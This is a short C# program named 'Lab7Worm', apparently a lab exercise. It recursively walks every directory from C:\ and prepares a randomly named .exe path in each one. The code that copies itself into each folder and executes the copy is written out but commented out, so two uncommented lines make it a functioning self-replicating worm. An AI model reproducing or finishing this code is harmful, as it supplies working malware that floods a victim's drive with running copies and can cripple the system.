using System;
using System.IO;

namespace Lab7Worm
{
    class Program
    {
        public static string pathExe;
        static void Main(string[] args)
        {
            pathExe = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            Console.WriteLine(pathExe);

            try
            {
                getAllDirections(@"C:\\", pathExe);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            Console.ReadLine();
        }

        public static bool getAllDirections(string path, string pathExe)
        {
            string[] folders = Directory.GetDirectories(path);
            foreach (var item in folders)
            {
                string randNameOfExe = Path.GetRandomFileName();
                string pathNewExe = item + "\\" + randNameOfExe.Remove(randNameOfExe.Length - 4) + ".exe";
                try
                {
                    //File.Copy(pathExe, pathNewExe);
                    getAllDirections(item, pathExe = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName);
                    Console.WriteLine("Succes!!!" + pathNewExe);
                    //System.Diagnostics.Process p = new System.Diagnostics.Process();
                    //p.StartInfo.FileName = pathNewExe;
                    //p.Start();
                }
                catch (Exception)
                {
                }
            }
            return true;
        }

    }
}
